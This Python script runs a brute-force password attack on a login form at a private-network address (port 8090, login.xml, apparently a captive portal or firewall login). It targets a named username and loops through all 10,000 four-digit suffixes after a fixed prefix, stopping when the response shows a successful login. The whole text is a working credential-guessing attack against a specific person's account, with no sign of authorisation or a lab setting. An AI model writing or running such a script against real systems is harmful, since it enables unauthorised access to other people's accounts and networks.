import requests

# URL to send the request
url = "http://192.168.1.1:8090/login.xml"

# Base password without digits
base_password = "AK@"

# Other form data
payload = {
    "mode": "191",
    "username": "anand.kumar",
    "a": "1738155857532",
    "producttype": "2"
}

# Loop through all four-digit combinations (0000-9999)
for i in range(10000):
    password = f"{base_password}{i:04d}"  # Format as four-digit (e.g., 0001, 0999)
    payload["password"] = password
    
    try:
        response = requests.post(url, data=payload)
        print(f"Trying: {password} | Status: {response.status_code}")
        
        if "logged" in response.text.lower():
            print(f"\nSuccess! Logged in with password: {password}")
            break  # Stop if "logged" is found

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        break  # Stop on connection error
